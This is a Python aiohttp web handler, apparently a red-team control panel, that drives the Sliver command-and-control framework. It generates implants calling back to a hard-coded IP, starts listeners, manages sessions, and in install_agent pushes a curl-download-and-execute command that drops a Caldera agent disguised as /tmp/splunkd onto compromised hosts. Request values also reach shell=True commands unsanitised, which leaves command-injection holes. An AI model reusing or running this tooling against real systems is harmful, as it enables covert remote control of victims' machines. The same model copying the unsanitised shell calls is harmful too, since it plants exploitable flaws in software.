import aiohttp_jinja2
from aiohttp import web
import asyncio
import os
import subprocess
import re

class SliverHandler:
    def __init__(self, services):
        self.services = services
        self.implant_dir = os.path.abspath("/tmp/implants")
        os.makedirs(self.implant_dir, exist_ok=True)
        self.ansi_escape = re.compile(r'(\x1b|\u001b|\033)\[[0-9;]*[mGKHF]')

    async def render_page(self, request):
        return aiohttp_jinja2.render_template('sliver.html', request, {})

    def run_escaped_sliver_command(self, tag, command):
        log_path = f"/tmp/sliver_{tag}.log"
        with open(log_path, "wb") as log_file:
            result = subprocess.run(command, shell=True, stdout=log_file, stderr=log_file)
        return log_path, result.returncode

    def run_sliver_command(self, tag, command):
        log_path = f"/tmp/sliver_{tag}.log"
        full_command = f'echo "{command}" | sliver-client'
        with open(log_path, "wb") as log_file:
            result = subprocess.run(full_command, shell=True, stdout=log_file, stderr=log_file)
        return log_path, result.returncode

    async def handle_generate(self, request):
        try:
            data = await request.json()
            filename = data.get('filename', 'implant_default')
            implant_path = os.path.join(self.implant_dir, filename)
            cmd = f"generate --http http://43.200.213.119 --os linux --arch amd64 --format executable --save {implant_path}"
            log_path, code = self.run_sliver_command("generate", cmd)
            await asyncio.sleep(1)
            if not os.path.exists(implant_path):
                with open(log_path, 'r') as f:
                    log = f.read()
                return web.json_response({'error': f'Implant 파일 생성 실패\n[cmd]: {cmd}\n[log]:\n{log}'}, status=500)
            return web.json_response({'filename': filename})
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def list_implants(self, request):
        try:
            implants = [f for f in os.listdir(self.implant_dir) if os.path.isfile(os.path.join(self.implant_dir, f))]
            return web.json_response(implants)
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def delete_implant(self, request):
        try:
            data = await request.json()
            filename = data['filename']
            file_path = os.path.join(self.implant_dir, filename)
            if os.path.exists(file_path):
                os.remove(file_path)
                return web.json_response({'status': f'{filename} 삭제 완료'})
            else:
                return web.json_response({'error': '파일이 존재하지 않음'}, status=404)
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def server_status(self, request):
        try:
            result = subprocess.run(['pgrep', '-f', 'sliver-server'], capture_output=True, text=True)
            running = result.returncode == 0
            return web.json_response({'running': running})
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def start_server(self, request):
        try:
            subprocess.Popen(['sliver-server', 'daemon'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            await asyncio.sleep(2)
            result = subprocess.run(['pgrep', '-f', 'sliver-server'], capture_output=True, text=True)
            if result.returncode != 0:
                raise RuntimeError('sliver-server daemon 실행 실패')
            return web.json_response({'status': 'sliver-server 실행됨'})
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def list_sessions(self, request):
        try:
            log_path, code = self.run_sliver_command("sessions", "sessions")
            with open(log_path, "r") as f:
                output = self.ansi_escape.sub('', f.read())
            sessions = []
            for line in output.splitlines():
                if "ALIVE" in line or "DEAD" in line:
                    parts = line.split()
                    if len(parts) >= 5:
                        sessions.append({
                            'id': parts[0],
                            'hostname': parts[1],
                            'arch': parts[2],
                            'remoteAddr': parts[-1],
                            'status': parts[3]
                        })
            return web.json_response(sessions)
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def install_agent(self, request):
        try:
            data = await request.json()
            session_id = data['session_id']
            caldera_ip = data.get('caldera_ip', '127.0.0.1')
            cmd = (
                f"curl -s -X POST -H 'file:sandcat.go' -H 'platform:linux' http://{caldera_ip}:8888/file/download > /tmp/splunkd; "
                f"chmod +x /tmp/splunkd; "
                f"/tmp/splunkd -server http://{caldera_ip}:8888 -group red -v"
            )
            escaped_cmd = f'echo "use {session_id}\\nexecute /bin/bash -c \\\"{cmd}\\\"" | sliver-client'
            _, code = self.run_escaped_sliver_command("install", escaped_cmd)
            return web.json_response({'status': f'{escaped_cmd} Caldera agent 설치 명령 전송됨'})
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def start_job(self, request):
        try:
            data = await request.json()
            port = data.get('port', 80)
            cmd = f"http -d 43.200.213.119 -l {port}"
            _, code = self.run_sliver_command("start_job", cmd)
            return web.json_response({'status': f'Listener 포트 {port} 시작됨'})
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def list_jobs(self, request):
        try:
            log_path, code = self.run_sliver_command("jobs", "jobs")
            with open(log_path, "r") as f:
                output = self.ansi_escape.sub('', f.read())
            jobs = []
            for line in output.splitlines():
                if "http" in line:
                    parts = line.split()
                    jobs.append({
                        'id': parts[0],
                        'name': parts[1],
                        'protocol': parts[2],
                        'port': parts[3]
                    })
            return web.json_response(jobs)
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def delete_job_listener(self, request):
        try:
            data = await request.json()
            jobid = data.get('id')
            cmd = f"jobs -k {jobid}"
            _, code = self.run_sliver_command("stop_listener", cmd)
            return web.json_response({'status': f'id {jobid} Listener 중지'})
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)

    async def delete_session(self, request):
        try:
            data = await request.json()
            session_id = data.get('session_id')
            cmd = f"sessions -k {session_id}"
            _, code = self.run_sliver_command("exit_session", cmd)
            return web.json_response({'status': f'Session {session_id} 종료됨'})
        except Exception as e:
            return web.json_response({'error': str(e)}, status=500)
